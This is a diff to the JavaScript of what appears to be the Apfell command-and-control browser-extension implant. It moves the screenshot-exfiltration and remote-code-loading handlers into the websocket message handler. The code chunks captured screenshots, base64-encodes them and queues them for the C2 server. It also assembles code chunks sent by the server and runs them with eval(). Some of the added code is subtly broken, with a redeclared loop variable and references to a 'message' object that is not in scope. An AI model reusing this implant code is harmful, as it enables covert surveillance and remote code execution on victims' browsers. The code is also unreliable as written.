@@ -84,88 +84,6 @@ setInterval(function(){
     }
 }, C2.interval * 1000);
 
-chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
-    // Listen for task responses that require additional messages
-    switch (message.type) {
-        
-        case 'screencapture': {
-            // TODO: Chunk screencapture and send
-            let raw = screencaptures[message.index].image;
-            let i = 0;
-            let arrLength = raw.length;
-            let temp = [];
-            let chunkSize = 512000;
-
-            for (i = 0; i < arrLength; i+=chunkSize) {
-                let chunk = raw.slice(i, i+chunkSize);
-                temp.push(chunk);
-            }
-
-            // loop through the chunk array and send each one to apfell
-            for (let j = 0; j < temp.length; j++) {
-                let response = {
-                    'chunk_num': j+1,
-                    'file_id': message.file_id,
-                    'chunk_data': btoa(unescape(encodeURIComponent(temp[j]))),
-                    'task_id': screencaptures[message.index].task_id,
-                };
-
-                let outer_response = {
-                    'action':'post_response',
-                    'responses':[response],
-                    'delegates':[]
-                };
-
-                let enc = JSON.stringify(outer_response);
-                let final = apfell.apfellid + enc;
-                let msg = btoa(unescape(encodeURIComponent(final)));
-                out.push(msg);
-            }
-
-            // clear the entry
-            screencaptures[message.index] = {};
-
-            if (screencaptures.length === 1 ) {
-                screencaptures = [];
-            }
-            break;
-        }
-        case 'load': {
-            // process upload action
-
-            let load = loads[message.index];
-            if (message.chunk_num < message.total_chunks) {
-                let raw = atob(message.chunk_data);
-                load.data.push(...raw);
-                loads[message.index] = load;
-                let response = {'action':'upload','chunk_size': 1024000, 'chunk_num':(message.chunk_num + 1), 'file_id':load.file_id, 'full_path':''};
-                let encodedResponse = JSON.stringify(response);
-                let final = apfell.apfellid + encodedResponse;
-                let msg = btoa(unescape(encodeURIComponent(final)));
-                out.push(msg);
-            } else if (message.chunk_num === message.total_chunks) {
-                let raw = atob(message.chunk_data);
-                load.data.push(...raw);
-                eval(load.data);
-
-                let response = {'task_id':load.task_id, 'user_output': load.name + " loaded", "completed":true};
-                let outer_response = {'action':'post_response', 'responses':[response], 'delegates':[]};
-                let enc = JSON.stringify(outer_response);
-                let final = apfell.apfellid + enc;
-                let msg = btoa(unescape(encodeURIComponent(final)));
-                out.push(msg);
-            }
-
-
-
-            break;
-        }
-        default : {
-
-        }
-    }
-});
-
 connection.onopen = function () {
     C2.checkIn();
 };
@@ -216,10 +134,45 @@ connection.onmessage = function (e) {
                 // check for screencaptures 
                 if (screencaptures.length > 0) {
                     for (let i = 0; i < screencaptures.length; i++) {
-                        let equal = response['task_id'].localeCompare(screencaptures[i]['task_id']);
+                        let equal = response.task_id.localeCompare(screencaptures[i].task_id);
                         if (equal === 0) {
                             // TODO: chunk the screencapture data
-                            chrome.runtime.sendMessage({'type':'screencapture', 'file_id':response['file_id'], 'index':i});
+                            let raw = screencaptures[i].image;
+                            let i = 0;
+                            let arrLength = raw.length;
+                            let temp = [];
+                            let chunkSize = 512000;
+
+                            for (i = 0; i < arrLength; i+=chunkSize) {
+                                let chunk = raw.slice(i, i+chunkSize);
+                                temp.push(chunk);
+                            }
+
+                            // loop through the chunk array and send each one to apfell
+                            for (let j = 0; j < temp.length; j++) {
+                                let response = {
+                                    'chunk_num': j+1,
+                                    'file_id': message.file_id,
+                                    'chunk_data': btoa(unescape(encodeURIComponent(temp[j]))),
+                                    'task_id': screencaptures[message.index].task_id,
+                                };
+
+                                let outer_response = {
+                                    'action':'post_response',
+                                    'responses':[response],
+                                    'delegates':[]
+                                };
+
+                                let enc = JSON.stringify(outer_response);
+                                let final = apfell.apfellid + enc;
+                                let msg = btoa(unescape(encodeURIComponent(final)));
+                                out.push(msg);
+                            }
+
+                            screencaptures[i] = {};
+                            if (screencaptures.length === 1 ) {
+                                screencaptures = [];
+                            }
                         }
                     }
                 }
@@ -235,7 +188,29 @@ connection.onmessage = function (e) {
                     for (let i = 0; i < loads.length; i++) {
                         let equal = response.task_id.localeCompare(loads[i].task_id);
                         if (equal === 0) {
-                            chrome.runtime.sendMessage({'type':'load', 'total_chunks': response.total_chunks, 'chunk_num': response.chunk_num, 'chunk_data': response.chunk_data, 'index':i});
+                            let load = loads[i];
+                            if (response.chunk_num < response.total_chunks) {
+                                let raw = atob(response.chunk_data);
+                                load.data.push(...raw);
+                                loads[i] = load;
+                                let resp = {'action':'upload','chunk_size': 1024000, 'chunk_num':(response.chunk_num + 1), 'file_id':load.file_id, 'full_path':''};
+                                let encodedResponse = JSON.stringify(resp);
+                                let final = apfell.apfellid + encodedResponse;
+                                let msg = btoa(unescape(encodeURIComponent(final)));
+                                out.push(msg);
+                            } else if (response.chunk_num === response.total_chunks) {
+                                let raw = atob(response.chunk_data);
+                                load.data.push(...raw);
+                                eval(load.data);
+
+                                let response = {'task_id':load.task_id, 'user_output': load.name + " loaded", "completed":true};
+                                let outer_response = {'action':'post_response', 'responses':[response], 'delegates':[]};
+                                let enc = JSON.stringify(outer_response);
+                                let final = apfell.apfellid + enc;
+                                let msg = btoa(unescape(encodeURIComponent(final)));
+                                loads[i] = {};
+                                out.push(msg);
+                            }
                         }
                     }
                 }
